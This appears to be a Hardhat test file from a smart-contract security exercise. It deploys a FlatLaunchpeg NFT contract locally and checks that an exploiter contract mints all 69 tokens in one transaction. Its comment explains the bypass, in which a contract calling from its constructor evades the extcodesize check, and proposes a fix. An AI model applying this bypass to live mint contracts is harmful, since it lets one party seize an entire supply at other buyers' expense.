

import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { Contract, Signer } from "ethers"


let accounts: Signer[];
let attacker: Signer;
let o1: Signer;
let o2: Signer;
let admin: Signer; // should not be used
let flatLaunchpeg: Contract;
let startBlock: Number;
let AttackContract: Contract;

describe("Exploiter", function () {
	async function deployExploiter() {

		accounts = await ethers.getSigners();
		[attacker, o1, o2, admin] = accounts;


		const flatLaunchpegFactory = await ethers.getContractFactory('FlatLaunchpeg')
		flatLaunchpeg = await flatLaunchpegFactory.connect(admin).deploy(69, 5, 5)

		startBlock = await ethers.provider.getBlockNumber()

		return { admin, attacker, flatLaunchpeg };
	}


	/*
	In this code base the vulnerability is on the modifier(isEOA()) which check that the caller of the function 
	 do not have a code. at  deployment of any smart contract the length 
	of the code is zero which makes any one to mint all the NFT  from the FlatLaunch contract, 
	*/

	// A recommendation will be to have the modifier like this 
	/* 
	modifier isEOA() {
	   uint256 size;
	   address sender = msg.sender;
		assembly {
			size := extcodesize(sender)
		}
		if (size > 0) revert Launchpeg__Unauthorized();
			 require(tx.origin == msg.sender, "Contract accounts are not allowed");
		_;
		}
	*/
	describe("flatLaunchpeg contract exploit", function () {
		it("It should exploit flatLaunchpeg contract", async function () {
			const { flatLaunchpeg, attacker } = await loadFixture(deployExploiter);
			const AttackFactory = await ethers.getContractFactory("jpegSniperExploiter")
			AttackContract = await AttackFactory.connect(attacker).deploy(flatLaunchpeg.address, await attacker.getAddress())

			// check that all tokens was minted to attecker address and it happened in one single transaction
			expect(await flatLaunchpeg.totalSupply()).to.be.equal(69)
			expect(await flatLaunchpeg.balanceOf(await attacker.getAddress())).to.be.equal(69)
			expect(await ethers.provider.getBlockNumber()).to.be.equal(startBlock + 1)

		})

	})
})



